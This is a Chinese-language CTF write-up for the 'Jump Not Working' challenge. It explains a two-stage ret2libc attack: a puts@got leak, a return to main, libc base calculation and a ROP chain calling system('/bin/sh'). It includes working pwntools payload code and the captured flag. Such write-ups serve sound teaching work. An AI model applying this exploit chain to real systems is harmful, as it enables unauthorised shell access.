# Jump Not Working

## 题目简述

第三个程序有栈溢出，但没有现成的 win 函数，NX 又阻止栈代码执行。需要通过 ROP 泄漏 libc 地址，回到 `main` 接收第二阶段输入，再调用 `system("/bin/sh")`。

## 解题过程

覆盖 RIP 的偏移为 `72`。第一阶段调用 `puts(puts@got)`，把真实 `puts` 地址输出，然后返回 `main`：

```python
from pwn import *

elf = context.binary = ELF("./jump_not_working")
libc = ELF("./libc.so.6")
rop = ROP(elf)

payload = flat(
    b"A" * 72,
    rop.find_gadget(["pop rdi", "ret"]).address,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)
```

接收泄漏后计算：

```python
libc.address = leaked_puts - libc.symbols["puts"]
binsh = next(libc.search(b"/bin/sh\x00"))
```

第二阶段再覆盖返回地址：

```python
payload = flat(
    b"A" * 72,
    rop.find_gadget(["ret"]).address,
    rop.find_gadget(["pop rdi", "ret"]).address,
    binsh,
    libc.symbols["system"],
)
```

取得 shell 后得到：

```text
UMDCTF-{JuMp_1s_N0w_w0RK1nG}
```

若未提供匹配 libc，也可使用 ret2dlresolve 让动态链接器解析 `system`，但两阶段 ret2libc 更直观。

## 方法总结

当 NX 开启且没有 win 函数时，先找可复用的输出函数建立地址泄漏，再依据给定 libc 计算基址。返回 `main` 将一次输入扩展成两阶段利用；额外 `ret` 用于修复 amd64 ABI 的栈对齐。
